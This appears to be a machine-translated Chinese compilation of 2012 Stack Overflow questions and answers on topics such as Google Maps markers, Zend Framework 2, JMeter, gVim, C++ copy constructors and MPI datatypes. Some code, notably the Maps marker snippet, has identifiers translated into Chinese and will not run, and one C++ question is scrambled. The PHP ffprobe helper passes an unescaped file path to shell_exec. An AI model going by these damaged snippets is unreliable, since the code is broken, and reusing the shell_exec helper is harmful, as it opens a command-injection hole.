* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T19:43:34.600

你有一个 Javascript 错误

`,`在第三个位置之后，您在方括号后缺少一个逗号`]`

```
///....剪断
“布鲁克莱恩广场 10 号”，
"42.33262",
“-71.116439”
]， //就在这儿
[
《地铁栗子山》，
“绿线，D”，
///...剪辑

```

编辑

向地图添加自定义标记添加图标属性，如下所示 - 简单的方法是只放入一个 url - 如果要定义阴影和锚点，则很难构建一个 - 请参阅 Google Maps API 了解更深入的内容

```
var 标记 = 新的 google.maps.Marker({
    icon : "http://urlofmymarker.png", //逗号很重要
    位置：latlng，
    地图：地图
});

```

# php - Zend 2：来自视图助手错误的模型表

> ID：13093262
> 
> 赞同：0
> 
> 时间：2012-10-26T19:33:03.547
> 
> 标签：php, zend-framework2

我在从视图助手设置模型表时遇到问题。我使用了与常规控制器中使用的完全相同的代码：例如：

```
namespace Application\View\Helper;

use Zend\View\Helper\AbstractHelper;

use Application\Model\MenusTable;

use Zend\ServiceManager\ServiceLocatorAwareInterface;  
use Zend\ServiceManager\ServiceLocatorInterface; 

**snipped**

public function setServiceLocator(ServiceLocatorInterface $serviceLocator)  
{  
    $this->serviceLocator = $serviceLocator;  
    return $this;  
}

public function getServiceLocator()  
{  
    return $this->serviceLocator;  
} 

public function getMenusTable()
{
    if (!$this->menusTable) {
        $sm = $this->getServiceLocator();
        $this->menusTable = $sm->get('Application\Model\MenusTable');
    }

    return $this->menusTable;
}

public function allLinks()
{
    $all = $this->getMenusTable()->fetchAll();

    return $all;
} 
```

但是我遇到了这个错误：

`Catchable fatal error: Argument 1 passed to Application\Model\MenusTable::__construct() must be an instance of Zend\Db\Adapter\Adapter, none given, called in C:\xampp\**snipped**\zend\library\Zend\ServiceManager\AbstractPluginManager.php on line 177 and defined in C:\xampp\**snipped**\Application\src\Application\Model\MenusTable.php on line 14`

主控制器一切正常，但在这里我似乎遇到了一个大问题 - 我是 Zend 的新手，但似乎没有从 Module.php 文件中获取工厂 - 有没有办法得到它？

我在我的 Module.php 中有这个 - 正如所说它在常规控制器中工作正常，但在视图助手中由于某种原因它没有被处理：

```
public function getServiceConfig()
{
    return array
    (
        'factories' => array
        (
            'Application\Model\MenusTable' => function($sm)
            {
                $dbAdapter = $sm->get('Zend\Db\Adapter\Adapter');
                $table     = new MenusTable($dbAdapter);
                return $table;
            },
        ),
    );
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T20:01:32.373

重新阅读您的问题后，我意识到您使用的是 ZF2。

这是关于使用 ServiceLocators 的教程[http://framework.zend.com/wiki/display/ZFDEV2/Proposal+for+ServiceLocator+and+DependencyInjector](http://framework.zend.com/wiki/display/ZFDEV2/Proposal+for+ServiceLocator+and+DependencyInjector)

从文档中，您需要定义您的数据库连接。

```
$services = new ServiceLocator();

// Registering an object:
$services->set('db', $db);

// Lazy-loading by registering a closure:
$services->set('db', function() use ($config) {
$db = Db::factory($config->db);
    return $db;
});

// Retrieving:
$db = $services->get('db'); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-22T15:33:01.077

首先，您应该在模块中使用 getServiceConfig() ::

```
public function getServiceConfig()
{
    return array(
        'factories' => array(
            'MODULE\Model\MenusTable' =>  function($sm) {
                $tableGateway = $sm->get('MenusTableGateway');
                $table = new MenusTable($tableGateway);
                return $table;
            },
            'MenusTableGateway' => function ($sm) {
                $dbAdapter = $sm->get('Zend\Db\Adapter\Adapter');
                $resultSetPrototype = new ResultSet();
                $resultSetPrototype->setArrayObjectPrototype(new Menus());
                return new TableGateway('menus', $dbAdapter, null, $resultSetPrototype);
            },
        ),
    );
} 
```

适配器可能在您的 /config/autoload/global.php 中，如下所示：

```
 'service_manager' => array(
    'factories' => array(
        'Zend\Db\Adapter\Adapter' => 'Zend\Db\Adapter\AdapterServiceFactory',
    ),
),
// CONNECTION DB
'db' => array(
    'driver' => 'Pdo',
    'dsn' => 'mysql:dbname=YOURDBNAME;host=localhost',
    'username' => 'root',
    'password' => '',
    'driver_options' => array(
        PDO::MYSQL_ATTR_INIT_COMMAND => 'SET NAMES \'UTF8\''
    ),
), 
```

接下来，您的 View 助手必须扩展 AbstractHelper 并实现 ServiceLocatorAwareInterface

`class MyViewHelper extends AbstractHelper implements ServiceLocatorAwareInterface`

我会把代码放在我的[网站上](http://patricia-lestrat.com/zf2)

# algorithm - 最大和/面积子矩阵

> ID：13093263
> 
> 赞同：1
> 
> 时间：2012-10-26T19:33:10.033
> 
> 标签：algorithm, matrix

输入：nxn 正/负数矩阵和 k。

输出：子矩阵，其元素的最大总和除以其具有至少 k 个元素的元素数。

对于这个问题，有没有比 O(n^4) 更好的算法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-06T00:38:57.823

一种基于 FFT 的分治法来解决这个问题：

[https://github.com/tearn/maximum-submatrix-sum](https://github.com/thearn/maximum-submatrix-sum)

它不如 Kadane 的 (O(N^3) vs. O(N^3 log N)) 有效，但在解决方案构建方面确实给出了不同的看法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-14T19:37:12.277

有一个 O(n^3) 2-d kadane 算法用于在 nxn 矩阵中找到最大和子矩阵（即子矩形）。（您可以在 SO 上找到有关它的帖子，或在线阅读）。一旦您了解了算法的工作原理，很明显，如果您可以解决在 1-d 数组中找到长度至少为 m 的最大平均子区间的问题，您可以获得 O(n^3) 时间解决方案在 O(n) 时间内的 n 个数字。这确实是可能的，见论文 cs.slu.edu/~goldwasser/publications/DensityPreprint.pdf

因此，您的问题有一个 O(n^3) 时间解决方案。

# erlang - 当 erlide 尝试运行时 Eclipse 冻结

> ID：13093265
> 
> 赞同：0
> 
> 时间：2012-10-26T19:33:15.163
> 
> 标签：erlang, erlide

我刚刚开始使用 erlide，使用全新安装的 Eclipse Juno 和 erlide。我已经从命令行在我的系统（64 位 Fedora）上使用了 erlang，所以我只是想进行切换。我从 R15B 开始，并按照另一篇 SO 帖子的建议升级到 R15B02（从源代码构建）。如果我右键单击一个 .erl 文件并选择 Run As..Erlang Application，IDE 将冻结，我必须将其杀死。如果我尝试从 Run Configurations 运行并指定模块和函数，它将开始执行，但永远不会超过 27%。这是一个在命令行上即时运行的简单函数。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-27T08:53:40.423

请尝试来自[http://erlide.org/update_nightly](http://erlide.org/update_nightly)的最新每晚，我们针对类似问题做了一些工作，希望它们也能解决您的问题。

从 /erlide.log 查看日志会有所帮助。

您还可以从 run->configurations 打开启动配置，看看“运行时”选项卡的任何字段中是否有一些奇怪的值，很可能是节点主机名。

【我要离开一周左右，所以不能很快回答。对于那个很抱歉。]

/弗拉德

# tsql - 如何将存储过程中的字段子集添加到表变量？

> ID：13093266
> 
> 赞同：1
> 
> 时间：2012-10-26T19:33:14.373
> 
> 标签：tsql, stored-procedures, table-variable

```
Declare @tempTableVariable Table(
    email varchar(50)
)

Insert INTO @tempTableVariable 
EXEC GetData

select email
from @tempTableVariable 
```

我收到以下错误：“列名或提供的值的数量与表定义不匹配。”

是否有一种简单的方法可以从 GetData 获取子集，而无需显式声明表变量声明中的所有字段？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T19:41:40.970

如果您无法控制`GetData`存储过程，我认为没有任何方法可以避免必须声明表变量中的所有字段。

如果您可以控制`GetData`，您可以向其添加一个参数，当等于 1 时将按照您想要的方式返回结果，否则将执行当前的操作。

为了完整起见，我会提到它，但除了 INSERT EXEC 之外还有很多其他选项。 [http://www.sommarskog.se/share_data.html](http://www.sommarskog.se/share_data.html)很好地解释了这些选项。

# jquery - 将 jQuery Validator 设置为基于 ID

> ID：13093268
> 
> 赞同：0
> 
> 时间：2012-10-26T19:33:20.637
> 
> 标签：jquery, html, validation

我有一个带有 5 个下拉列表的表单，这些下拉列表由 php 在运行时生成，我想使用 jQuery 验证器进行验证。由于我给了他们一个名称数组，验证器只会验证第一个下拉列表，但我需要确保在发布我的表单之前验证所有 5 个下拉列表。

用于制作下拉菜单的 PHP

```
function activityDropDown($id){
      echo('<select id='.$id.' name=activity[]>
          <option></option>
          <option>a</option>
          <option>b</option>  
          <option>c</option>
        </select>');
}
<script type="text/javascript">
            $(document).ready(function(){
        $("#friDate").Zebra_DatePicker({
            format: 'm-d-Y',
            disabled_dates: ['* * * 0-4,6'],
            first_day_of_week: 0,
            onSelect: function(){
                var date = new Date($("#friDate").val());
                $("#mon").val(addDays(date, -4));
                $("#tue").val(addDays(date, -3));
                $("#wed").val(addDays(date, -2));
                $("#thu").val(addDays(date, -1));
                $("#fri").val(addDays(date, 0));        
            }
        });
        $("#form").validate();
        $("#monActivity").rules("add", {
            required: true
        });
        $("#tueActivity").rules("add", {
            required: true
        });
    });
</script>
            <tr>
                <td>Activity:</td>
                <td><?php activityDropDown('monActivity') ?></td>
                <td><?php activityDropDown('tueActivity') ?></td>
                <td><?php activityDropDown('wedActivity') ?></td>
                <td><?php activityDropDown('thuActivity') ?></td>
                <td><?php activityDropDown('friActivity') ?></td>
            </tr> 
```

如您所见，我尝试根据元素 ID 手动添加规则，但它仍然在做同样的事情；只有第一个下拉菜单会验证。

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T19:40:17.750

你缺少引号`id`

```
echo('<select id="'.$id.'" name="activity[]"> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T20:33:22.107

尝试这个：

```
function activityDropDown($id){
      static $activitynum = 0;
      echo("<select id='$id' name=activity[$activitynum]>
          <option></option>
          <option>a</option>
          <option>b</option>  
          <option>c</option>
        </select>");
      $activitynum++;
} 
```

这通过明确指定数组索引来解决验证插件中的限制，因此名称是不同的。

# c# - 如何在 MVC3 中使用相同的数据库进行身份验证和数据？

> ID：13093273
> 
> 赞同：1
> 
> 时间：2012-10-26T19:33:49.583
> 
> 标签：c#, asp.net-mvc-3, .net-4.0

使用 MVC3、VS 2010 和 SQL Express，我已经成功完成了一些教程。我现在想做的是构建我自己的应用程序，该应用程序将被部署。使用 Code First，我想让我的用户身份验证和数据驻留在同一个数据库中。从我读过的内容来看，这是可能的，（可以接受吗？）但到目前为止，我还没有找到任何关于如何让我的模型和成员资格映射到同一个数据库的信息——我想指定一个与 aspnet 不同的数据库。密度板。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T19:36:48.630

对于成员资格表，您可以[`aspnet_regsql.exe`](http://msdn.microsoft.com/en-us/library/ms229862.aspx)在命令行上使用该工具。

指定数据库和凭据，它将在该数据库上创建成员表。

您可以将实体框架指向同一个数据库。

这样，会员资格和 EF 都将存在于同一个数据库中。

# javascript - 使用jQuery在客户端处理Double.Nan？

> ID：13093275
> 
> 赞同：0
> 
> 时间：2012-10-26T19:33:59.017
> 
> 标签：javascript, jquery, json

当我使用`serializeSpecialFloatingPointValues()`方法时，服务器端成功地为 Nan 值生成 JSON 对象。由于客户端的 Nan，我收到错误消息。是否有一个选项可以包含在客户端来处理 Nan，类似于 jQuery 中服务器端可用的选项？

## 服务器端

服务端 Gson 成功生成 JSON 对象

```
GsonBuilder gsonBuilder = new GsonBuilder();  
gsonBuilder.serializeSpecialFloatingPointValues();  
Gson gson = gsonBuilder.setPrettyPrinting().create();  
String jsonString = gson.toJson(Object, HashMap.class);  
response.getWriter().write(jsonString);  
response.getWriter().flush(); 
```

从服务器生成的输出

```
{   
      "name": "ABC",  
      "data1": 511,  
      "data2": NaN  
} 
```

## 客户端

```
 $.ajax({
     url: "AbcServlet",
     data: {
         input: abc,
     },
     dataType: "json",
     type: "GET",
     async: false,
     success: function (parsed_json) {
         evaluate(parsed_json);
     },
     error: function (request, status, error) {
         alert("Error " + error);
     }
 }); 
```

注意：如果将 json 响应输出中的 Nan 替换为数字，则客户端可以正常工作。

我的问题是，如果[com.google.gson.Gson](http://code.google.com/p/google-gson/)有处理或生成 Nan 的选项，那么客户端也必须有一些选项来处理它。

# csv - 如何在 JMeter 的 while 循环中使用 CSV 数据集配置？

> ID：13093282
> 
> 赞同：8
> 
> 时间：2012-10-26T19:34:31.217
> 
> 标签：csv, while-loop, jmeter

我需要针对 5 到 10 台服务器测试同一组 url。URL 在 CSV 文件中定义。服务器名称在用户定义的变量配置中定义。

我正在使用基于服务器数量的 While 控制器来迭代和执行 url 请求。我当前的逻辑定义如下：

```
Thread group
  While controller
   Counter (defines number of servers)
   While controller (inner check "${URL}" != "<EOF>")
     CSV Data Set Config (stop EOF is true)
       HTTP Sampler (with url data) 
```

根据逻辑，我的脚本将运行并读取 CSV 文件一次并停止。它不是在读取外循环。只有内循环并停止。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-11-08T23:40:49.213

引用[CSV 数据集的 JMeter 手册](http://jmeter.apache.org/usermanual/component_reference.html#CSV_Data_Set_Config)：

> 默认情况下，文件只打开一次，每个线程将使用文件中不同的行。但是，将行传递给线程的顺序取决于它们的执行顺序，这可能在迭代之间有所不同。在每次测试迭代开始时读取行。文件名和模式在第一次迭代中被解析。

**线程组不能嵌套。**因此，您必须**使用线程组在 CSV 中进行迭代，并使用 foreach 在其他内容中进行迭代**。第二个选项是**使用 URL+Server 变体生成 CSV**，并仅使用单个线程组来读取 CSV。

## 第一个选项在这里。

迭代 URL 外循环，迭代服务器内循环。你只需要一个线程组和一个 foreach 在里面。看图片： ![用户定义的变量（服务器）](../Images/c6bdb74cde6ee84fc74290de4d23f95e.png) ![在此处输入图像描述](../Images/4bb18d9bd58e811b67e6ce48834c12e2.png) ![在此处输入图像描述](../Images/216e30b30d5b0a655c173052c3dccc2c.png) ![在此处输入图像描述](../Images/ed8fd0fcbbb3e58a4be68d75a3697ad2.png)

样本结果： ![在此处输入图像描述](../Images/0f2c6ae60a01a9a549a14bfa030fc129.png) ![在此处输入图像描述](../Images/86aa5983d923112e66c619fdce67f3c2.png) ![在此处输入图像描述](../Images/aa172e35e42a20d791e7db59fe7d2c2a.png)

当然还有 3 个结果...

如果你有时间，你也可以玩[CSVRead 功能](http://jmeter.apache.org/usermanual/functions.html#__CSVRead):)

# vim - gVim 根据窗口大小动态改变字体

> ID：13093289
> 
> 赞同：7
> 
> 时间：2012-10-26T19:35:12.777
> 
> 标签：vim

我在 GNU/Linux 机器上运行 gVim 7.3。我想知道是否有办法根据窗口大小自动更改字体。我对 Vim 比较陌生，所以我对它并不熟悉。

我的情况是这样的：我使用 DejaVu Sans Mono 12 作为我的默认字体，但有时我想在我输入时缩小 Vim 窗口以查看屏幕上的某些内容时切换到 Terminus 9。（你知道，对于那些不想在工作区之间不断切换的笔记本电脑屏幕很小的人来说......！）

所以我想知道如果我将默认窗口大小缩小到足够小，以便 Vim 自动调整字体，这种行为是否可以通过 .vimrc 文件中的命令自动发生。

有任何想法吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-26T19:59:25.853

Vim`VimResized`在其窗口大小改变时触发该事件。然后，您可以编写一个适应字体 ( `'guifont'`) 的 autocmd。这是一个仅考虑`'columns'`（不是 ' `lines'`）的示例，并且具有硬编码的字体名称：

```
function! FontChangeOnResize()
    if &columns > 80
        set guifont=Lucida_Console:h14
    elseif &columns > 60
        set guifont=Lucida_Console:h12
    elseif &columns > 40
        set guifont=Lucida_Console:h10
    elseif &columns > 20
        set guifont=Lucida_Console:h8
    else
        set guifont=Lucida_Console:h6
    endif
endfunction
autocmd VimResized * call FontChangeOnResize() 
```

# c++ - c++ Derived Default 复制构造函数用什么初始化 Base 复制构造函数？

> ID：13093291
> 
> 赞同：0
> 
> 时间：2012-10-26T19:35:47.697
> 
> 标签：c++, copy-constructor

**代码：**

```
#include<iostream>
using namespace std;

class B{
    public:
    int b;
    B(int x):b(x){
        cout << "B() Constructor " << endl;}
    B(const B& m):b(m.b){
        cout << "B(const B&) copy constructor "<< endl;}
};

class D:public B{
    public:
    D(int x):B(x){
        cout << "D() Constructor " << endl;}
    D(const D& n):B(n){ // at this point n should be casted to B object !!?
        cout << "D(const D&) copy constructor " << endl;}
    operator B(){
        cout << "operator B" << endl;
        return B(this->b);}

};

int main(){

D ob(1);
cout << "---" << endl;
D oc=ob;
} 
```

* * *

**输出：**

```
B() Constructor
D() Constructor
---
B(const B&) copy constructor
D(const D&) copy constructor 
```

* * *

**问题：**

1）如果我没有提供我的`D`复制构造函数，默认的复制构造函数`D`必须通过调用复制构造函数来初始化 Base 对象`B`。我的问题是复制构造函数的参数是什么`B`？它是一个`D`对象，然后它将被转换为一个`B`对象吗？

2) 在 的复制构造函数中，我使用object进行了`D`初始化，并且没有调用which 证明类型的对象没有被强制转换为，因此它可以作为参数传递给复制构造函数。这种行为有什么解释吗？`B``D``n``operator B()``n``D``B``B`

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-26T19:40:17.167

首先，**强制转换**是您在代码中编写的用于告诉编译器进行转换的东西。有两类转换：隐式和显式。隐式转换将在需要时完成，无需强制转换。显式转换需要强制转换。您在这里谈论的是**隐式转换**，而不是强制转换。

答案是存在从对派生类型的引用到对基类型的引用的隐式转换。就这么简单：n 是一个 D&，它可以通过隐式转换其类型来传递给一个接受 B& 的函数。

# jquery - 禁用对具有多个 tbody 的表的某些 tbody 应用表排序器

> ID：13093292
> 
> 赞同：0
> 
> 时间：2012-10-26T19:35:50.257
> 
> 标签：jquery, tablesorter

我在同一张桌子上有两个不同的 tbody。我只想在第一个 tbody 上使用表格分类器。有没有办法单独为第二个 tbody 跳过使用 tablesorter ？？？

```
<table>
<tbody id="1"></tbody>  /* Apply table sorter for this tbody */
<tbody id="2"></tbody>  /* Don't Apply table sorter for this tbody*/
</table> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-27T12:44:32.963

我猜你正在使用我[的 tablesorter 分支，](http://mottie.github.com/tablesorter/docs/index.html)它支持[对多个 tbodies 进行排序](http://mottie.github.com/tablesorter/docs/example-multiple-tbodies.html)。原始插件仅对第一个 tbody 进行排序。

如果您希望 tablesorter 忽略任何 tbody，只需将类名添加`tablesorter-infoOnly`到 tbody。此类名称由[`cssInfoBlock`选项](http://mottie.github.com/tablesorter/docs/index.html#cssinfoblock)设置。

请注意，除非表格包含`thead`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-01T18:18:34.657

只需将第二个 tbody 作为另一个表，并使用 CSS 使它们看起来像一个表。

```
<table>/* Apply table sorter for this table */
<tbody id="1"></tbody>  
</table>

<table>/* Don't Apply table sorter for this table*/
<tbody id="2"></tbody>  
</table> 
```

# wpf - XAML、WPF 和 Windows 8

> ID：13093294
> 
> 赞同：3
> 
> 时间：2012-10-26T19:36:11.063
> 
> 标签：wpf, windows, xaml, xbap

我希望这里有人可以在这种情况下准确地向我解释 WPF 和 XAML 之间的区别：

我有一个使用 MVVM 和存储库模式在 VB.NET 中编写的应用程序（特别是 XBAP），实现了通常的 INotifyPropertyChanged、OLEDB 等。

应用程序的前端是用 XAML 编写的。

据我了解，这个应用程序没有什么特别的“WPF”。在我看来，它的 XAML + VB.NET；WPF 是从哪里来的？鉴于 Windows 8 和我不断听到的“Silverlight/WPF 之死”，我应该如何“升级”我的应用程序以确保它的未来？

我将非常感谢有人为我解决这个困惑。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-26T19:40:45.413

XAML + 您背后的代码是 WPF。您正在使用 WPF。XAML 是用于在 WPF 中定义接口的标记。

在这一点上，我不会太担心“Silverlight/WPF 的消亡”。仅仅因为 Windows 8 支持 HTML5/JavaScript 并不意味着 WPF 已经消失。至少，现在还没有。

[另请参阅](http://en.wikipedia.org/wiki/Windows_Presentation_Foundation)。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-26T19:42:05.893

[XBAP](http://msdn.microsoft.com/en-us/library/aa970060.aspx)（XAML 浏览器应用程序）是一种在浏览器中运行的 WPF XAML 应用程序。不多也不少。

WPF 不会很快消失。事实上，它在 .NET 4.5 中得到了许多增强。Windows 8 将继续支持 WPF，无论它是在桌面上运行还是作为 XBAP 运行。无需“升级”您的应用程序，但如果您想利用 Windows 应用商店和新的用户界面，[将 WPF XAML 移植](http://msdn.microsoft.com/en-us/library/windows/apps/xaml/br229571.aspx)到 WinRT XAML 并不难。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-29T05:37:54.470

看，WPF 可以称为 WinForms 的继承者。在 WPF 中，我们有这个 XAML，它只是 XML，但更强大，具有更大的属性。WPF 没有死！谈到 Windows 应用商店应用，Silverlight 与 WPF 和 XAML 有很大关系

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-14T04:00:20.360

您的 XBAP 应用程序使用 WPF：XAML 用于 UI，VB.NET 用于后面的代码。如果您想确定，请检查您在代码中使用的命名空间是否以“System.Windows”开头。

您的 XBAP 只是一种可以使用 WPF 技术创建的项目。（这是一个将多个网页显示为 UI 的应用程序）。

# php - 如何确定 PHP/FFMPEG/PhoneGap 中的视频旋转/方向？

> ID：13093295
> 
> 赞同：2
> 
> 时间：2012-10-26T19:36:12.777
> 
> 标签：php, cordova, ffmpeg

将视频上传到服务器后，我将使用 FFMPEG 创建屏幕截图。问题是，如果用户以纵向模式拍摄视频，则屏幕截图会旋转 90º。可笑的是，PhoneGap、FFMEG-php 和 FFMPEG 似乎没有提供读取视频旋转/方向值的机制。

我找到了另一个名为[mediainfo](http://mediainfo.sourceforge.net/en/Download/CentOS)的库，它将提供信息，但不是以易于阅读/消化的方式，我试图避免使用另一个库。

我对 PhoneGap/FFMPEG 有什么误解吗？有没有直接确定视频方向的方法？

* * *

这是我作为 PHP 函数的解决方案：

```
function get_video_orientation($video_path) {
    $cmd = FFMPEG_PATH . "ffprobe " . $video_path . " -show_streams 2>/dev/null";
    $result = shell_exec($cmd);

    $orientation = 0;
    if(strpos($result, 'TAG:rotate') !== FALSE) {
        $result = explode("\n", $result);
        foreach($result as $line) {
            if(strpos($line, 'TAG:rotate') !== FALSE) {
                $stream_info = explode("=", $line);
                $orientation = $stream_info[1];
            }
        }
    }

    return $orientation;
} 
```

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2014-06-14T02:39:46.140

使用 MediaCodec 查找旋转值。然后使用 FFMPEG 旋转视频。

例如：ffmpeg -i in.avi -vf "transpose=1" out.avi

这会将视频顺时针翻转 90 度。

# email - 从电子表格 onOpen 发送电子邮件

> ID：13093296
> 
> 赞同：0
> 
> 时间：2012-10-26T19:36:22.247
> 
> 标签：email, google-apps-script, google-sheets, triggers

我有一个在我的公司上执行 CRM 系统的脚本，并且我使用 Fusion 表作为数据库。每次我输入一条新记录时，这条记录都会保存在这个融合表上。执行保存操作时，我使用以下代码在电子表格中复制数据，将其传递给数据库，以便备份数据：

```
function AtualizarSpreadsheet(e)
{
  var app = UiApp.getActiveApplication();
  var planilha = SpreadsheetApp.openById(SPREADSHEET_ID);
  var sheet = planilha.getActiveSheet();

  var enviado = "NÃO";
  var id = e.parameter.id;
  var nomeDoReclamante = e.parameter.nomeDoReclamante;
  var telefone = e.parameter.telefone;
  var ddd = e.parameter.ddd;
  var prefixo = e.parameter.prefixo;
  var sufixo = e.parameter.sufixo;
  var email = e.parameter.email;
  var regiao = e.parameter.regio;
  var categoria = e.parameter.categoria;
  var produto = e.parameter.produto;
  var subcategoria = e.parameter.subcategoria;
  var versaoDeSoftware = e.parameter.versoDeSoftware;
  var dataDeInicio = e.parameter.dataDeInicio;
  var dia = e.parameter.dia;
  var mes = e.parameter.ms;
  var ano = e.parameter.ano;
  var tituloDoProblema = e.parameter.ttuloDoProblema;
  var descricao = e.parameter.descrio;
  var status = e.parameter.status;
  var prioridade = e.parameter.prioridade;
  var informarEngenharia = e.parameter.informarEngenharia;
  var dataDeRegistro = e.parameter.dataDeRegistro;
  var horaDeRegistro = e.parameter.horaDeRegistro;
  var historico = e.parameter.histrico;
  var ordem = e.parameter.ordem;
  sheet.s
  sheet.appendRow([enviado,
                   id,
                   nomeDoReclamante,
                   telefone,
                   ddd,
                   prefixo,
                   sufixo,
                   email,
                   regiao,
                   categoria,
                   produto,
                   subcategoria,
                   versaoDeSoftware,
                   dataDeInicio,
                   dia,
                   mes,
                   ano,
                   tituloDoProblema,
                   descricao,
                   status,
                   prioridade,
                   informarEngenharia,
                   dataDeRegistro,
                   horaDeRegistro,
                   historico,
                   ordem]);
  return app;
} 
```

在电子表格上，我执行一个函数 onOpen() 以在每次打开电子表格时发送一封电子邮件。但是，当我的融合表脚本执行命令时：SpreadsheetApp.openById(SPREADSHEET_ID); onOpen() 函数没有被触发。即使我打开电子表格，我也无法运行该功能。onOpen() 函数详述如下：

```
function onOpen() 
{
    MailApp.sendEmail("EMAIL", "SUBJECT", "BODY");
} 
```

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T20:27:44.110

您正在尝试调用简单触发器中不支持的服务 (MailApp)。您需要调用您的 onOpen() 函数不同的东西，并附加一个可安装的“打开时”触发器来代替。

[https://developers.google.com/apps-script/understanding_triggers](https://developers.google.com/apps-script/understanding_triggers)

# c# - 从 aspx 页面调用 codeBehind 函数的问题

> ID：13093298
> 
> 赞同：2
> 
> 时间：2012-10-26T19:36:42.273
> 
> 标签：c#, asp.net

因此，大约四年前其他人在 Visual Studios 2008 中构建的 ASP.net 项目现在需要更改它的一些硬编码值，而我的任务是重建它。我正在使用视觉工作室 2012。

我对 ASP 没有很好的掌握，因为这不是我通常做的。我在使用以下（编辑的）代码时遇到问题：

```
<%@ Page Language="C#" AutoEventWireup="True" 
CodeBehind="CourseList.aspx.cs" Inherits="ah.CourseList" %>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
</head>

<body>
<form id="form1" runat="server">
<% writeCourseList(); %> <!--Compiler complains -->
</form>
</body>
</html> 
```

Visual Studios 说“当前上下文中不存在名称‘writeCourseList’”

我很困惑，因为 writeCourseList 是 CourseList 类中的公共方法。此外，此代码必须在某一时刻编译，因为它可以在实时服务器上运行。课程列表类：

```
namespace ah{
    public partial class CourseList: System.Web.UI.Page{
        protected void Page_Load(object sender, EventArgs e)
        {

        }

        public void writeCourseList()
        { //do stuff}
    }
} 
```

任何帮助，将不胜感激。另外，请随时建议我如何更好地提出这个问题。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T19:40:25.550

尝试

```
public string writeCourseList()
{
    return "this is a course list";
} 
```

当您想使用内联 asp.net 标记时，您需要从方法中返回一个字符串。

[内联 asp.net 标签...将它们全部排序（<%$、<%=、<%、<%# 等）](http://naspinski.net/post/inline-aspnet-tags-sorting-them-all-out-%283c25242c-3c253d2c-3c252c-3c252c-etc%29.aspx)

但相反，我不会使用这个 classis asp 样式。`GridView, Repeater, ListView,DataList`您应该使用类似或简单的Web 数据绑定控件[`ListBox`](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.listbox.aspx)。

例如：

```
protected void Page_Load(object sender, EventArgs e)
{
    if(!IsPostBack)
     {
          listBox1.DataSource = getAllListCourses(); // f.e. a DataTable
          listBox1.DataTextField  = "TextColumn";
          listBox1.DataValueField = "IdColumn";
          listBox1.DataBind();
     }
} 
```

您也可以手动：[`add`](http://msdn.microsoft.com/en-us/library/e7s6873c.aspx) [`ListItems`](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.listitem.aspx)

```
listBox1.Items.Add(new ListItem("Course-name","ID")); 
```

# java - 如何在 java 或 jquery 的网站上创建可移植/rss 评论提要？

> ID：13093299
> 
> 赞同：0
> 
> 时间：2012-10-26T19:36:44.650
> 
> 标签：java, jquery, rss

我正在尝试从我的网站创建评论提要，任何用户都可以将其嵌入到他们的网站或博客中。例如，如果您查看此测试
[http://www.skill-guru.com/test/81/core-spring-3.0-certification-mock](http://www.skill-guru.com/test/81/core-spring-3.0-certification-mock)

它有测试评论。注册用户可以发表评论，我们正在添加一项功能，Facebook 用户也可以在其中添加评论。
如果这个测试的创建者想在他自己的网站上显示评论，我是否需要为他可以插入他的博客/网站的评论创建一个 rss 提要？
或者我应该通过 JSON API 公开评论，这对测试创建者来说是技术性的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T19:47:15.707

不要通过发明开发人员应该解析的自己的 json 结构来重新创建轮子。跟上 RSS 及其变体/Atom 已经够难的了。问问自己，当 json 格式以向后不兼容的方式更改时（出于正当理由），你会怎么做。它只是不值得。RSS / ATOM 也有许多小部件/阅读器。一些开发人员仅通过阅读这些提要并以巧妙的方式展示它们就制作了完整的产品。如果您选择标准的 Feed 格式，您可以背负这些工作。

坚持标准。你的生活会轻松很多。

# mpi - 用 mpi 数据类型置换 3-d 数组

> ID：13093301
> 
> 赞同：1
> 
> 时间：2012-10-26T19:36:55.257
> 
> 标签：mpi

假设您有一个 3d 数组 A[I][J][K]，但您想将其置换为 B[J][K][I]。

这个问题与此处讨论的二维数组转置问题相似但不同： [Can you transpose array when sent using MPI_Type_create_subarray?](https://stackoverflow.com/questions/5626123/can-you-transpose-array-when-sending-using-mpi-type-create-subarray) .

MPI 标准提供了具有用户定义数据类型的多维数组操作示例，但没有提供这种特殊情况：[http ://www.mpi-forum.org/docs/mpi-11-html/node61.html](http://www.mpi-forum.org/docs/mpi-11-html/node61.html)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T19:36:55.257

做到这一点的方法是使用`MPI_TYPE_VECTOR`and `MPI_TYPE_CREATE_HVECTOR`，但魔鬼在细节中。

```
/* data[I][J][K] is I by J by K (stored in array 'dim_sizes[] = {I, J, K}'
   and we want permuted[J][K][I] */

/* new innermost dimension is I items, strided across the old JK face*/
MPI_Type_vector(dim_sizes[0], 1, dim_sizes[1]*dim_sizes[2], 
    MPI_DOUBLE, &one_d);
